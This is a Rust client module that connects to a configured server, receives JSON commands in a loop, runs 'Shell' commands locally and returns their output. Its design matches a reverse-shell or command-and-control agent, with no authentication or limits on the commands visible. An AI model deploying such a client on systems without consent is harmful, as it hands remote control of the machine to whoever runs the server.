use crate::config::Config;
use crate::connection::Connection;
use crate::commands::{CommandRequest, CommandType};
use serde_json;

pub struct Client {
    connection: Option<Connection>,
    config: Config,
}

impl Client {
    pub fn new(config: Config) -> Self {
        Client {
            connection: None,
            config,
        }
    }

    pub fn connect(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let addr = format!("{}:{}", 
            self.config.client.server_host, 
            self.config.client.server_port);
            
        let connection = Connection::connect(&addr)?;
        self.connection = Some(connection);
        println!("Connected to server at {}", addr);
        Ok(())
    }

    pub fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        if self.connection.is_none() {
            self.connect()?;
        }
        
        loop {
            let conn = self.connection.as_mut().unwrap();
            
            // Receive command from server
            let mut buf = [0; 4096];
            let read = conn.receive(&mut buf)?;
            if read == 0 {
                println!("Server closed connection");
                return Ok(());
            }

            let cmd_str = std::str::from_utf8(&buf[0..read])?;
            let cmd: CommandRequest = serde_json::from_str(cmd_str)?;
            
            match cmd.cmd_type {
                CommandType::Exit => {
                    println!("Server requested exit");
                    return Ok(());
                }
                CommandType::Shell => {
                    let response = crate::commands::execute_shell_command(&cmd.command);
                    let response_str = serde_json::to_string(&response)?;
                    conn.send(response_str.as_bytes())?;
                }
            }
        }
    }
}
